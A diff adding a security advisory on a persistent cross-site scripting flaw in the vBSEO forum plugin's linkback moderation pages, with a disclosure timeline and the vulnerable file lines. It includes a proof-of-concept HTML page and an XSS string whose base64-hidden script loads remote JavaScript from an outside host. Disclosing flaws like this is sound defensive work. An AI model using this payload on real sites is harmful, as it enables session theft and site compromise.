@@ -1,0 +1,57 @@
+vBSEO - Persistent XSS via LinkBacks
+
+http://www.exploit-db.com/vbseo-from-xss-to-reverse-php-shell/
+
+Versions Affected: 3.5.2 & 3.2.2 (Most likely all versions)
+
+Info:
+A proven success record, vBSEO powers the most optimized forums on the Web.
+The #1 SEO plugin and the only professional, fully supported solution. A full
+package of SEO enhancements, one install, one upgrade.
+
+External Links:
+http://www.vbseo.com
+
+Credits: MaXe (@InterN0T)
+
+
+-:: The Advisory ::-
+vBSEO is prone to persistent XSS due to insufficient sanitization of the titles on external websites vBSEO reads.
+ModCP & AdminCP has the following features affected: "Moderate LinkBacks", "Incoming LinkBacks", "Outgoing LinkBacks"
+
+Sample PoC:
+<html>
+<head>
+<title> [XSS String] </title>
+</head>
+<body>
+<a href="hxxp://vbulletin-installation-with-vbseo.tld/01-some-forum-thread.html">SEKSCY INJECT TIEM!</a> 
+</body>
+</html>
+
+After clicking the link, which the attacker has to do, vBSEO will initiate a GET-requested to the target and will
+then save the linkback if enabled, in either the incoming linkback list or the moderation queue. By default all
+linkbacks are enabled and this linkback is known as the "RefBack". (vBSEO checks the Referrer.)
+
+Sample XSS String:
+test"><script>document.write(atob(/PHNjcmlwdCBzcmM9Imh0dHA6Ly9pbnRlcm4wdC5uZXQvdXR1YmUvaW5kZXgucGhwP3hzcz1oYXgwcjF0bjB3ZjByMzQxIj48L3NjcmlwdD4=/.source));</script>
+
+
+-:: Solution ::-
+The vendor is still working on a patch even though it is very simple to patch.
+
+File: /modcp/vbseo_moderate.php
+Lines: 276 or 274 (depends on version), 230, 178, 112 are vulnerable.
+Details: Look for "$pback[t_title]" which is the major cause of this vulnerability.
+
+
+
+Disclosure Information:
+- Vulnerability found and researched: 16th December 2010
+- Disclosed to vendor (vBSEO): 16th December
+- Semi-Disclosed at InterN0T: 30th December
+- Detailed Disclosure: 31st January 2011
+
+
+References:
+http://forum.intern0t.net/intern0t-advisories/3559-vbseo-3-5-2-3-2-2-persistent-cross-site-scripting-via-linkbacks.html
